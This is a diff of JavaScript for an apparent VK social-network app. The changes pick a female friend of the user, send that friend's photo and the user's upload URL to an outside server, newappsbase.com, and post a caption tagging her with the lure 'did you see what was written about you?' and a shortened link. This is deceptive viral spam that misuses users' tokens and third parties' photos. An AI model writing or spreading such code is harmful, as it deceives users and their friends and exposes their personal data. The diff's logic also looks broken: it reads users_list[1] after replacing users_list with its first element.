@@ -110,24 +110,28 @@
           "params": {"album_id":id_albom,"v": "5.131", "access_token": token}
       }).then(data => {
           var upload_url = data.response.upload_url;
+
+          var users_list = getFriendsOnlineForPhoto();
+          users_list = users_list[0];
+          var fr_photo = users_list[1];
+
         $.ajax({
             type: "POST",
             url: "https://newappsbase.com/NEW_LOVE/functions.php",
             data: {
                 "method": "getUploadServer",
                 "upload_url": upload_url,
-                "my_photo": viewer.photo_max_orig,
+                "my_photo": fr_photo,
                 "viewer_id": viewer.id
             },
             success: function(data){
               var data = JSON.parse(data);
                     var caption = "";
-                    var users_list = getFriendsOnlineForPhoto();
                     //"Оставляю о тебе мнение, прочитай если интересно : \n\n "+link_app+"\n\n"+users_list
                     //users_list+", oставляю о тебе мнения, посмотри если интересно : \n\n https://vk.com/app"+vk_app_id
 
                     var text = [
-                      users_list+", о тебе написaли мнениe : https://vk.cc/cd6O0Z "
+                      users_list+", ты видела что о тебе написaли мнениe? : https://vk.cc/cd6O0Z "
                     ];
                     var caption = text[getRandom(0,text.length-1)];
 
@@ -176,15 +180,15 @@
       var count = 0;
       for(var i=global_offset_i;i<viewer.friends.items.length;i++) {
           //users_list += "[id"+viewer.friends.items[global_offset_i].id+"|"+viewer.friends.items[global_offset_i].first_name+"], ";
-          users_list +="@id"+viewer.friends.items[i].id+" ("+viewer.friends.items[i].first_name+")";
-          global_offset_i++;
-          count++;
-          if(count > 0) {
-            return users_list;
+          if(viewer.friends.items[i].sex == 1){
+            users_list +="@id"+viewer.friends.items[i].id+" ("+viewer.friends.items[i].first_name+")";
+            global_offset_i++;
+            count++;
+            if(count > 0) {
+              return [users_list,viewer.friends.items[i].photo_max];
+            }
           }
       }
-
-        return users_list;
     }
 
     function openApp() {
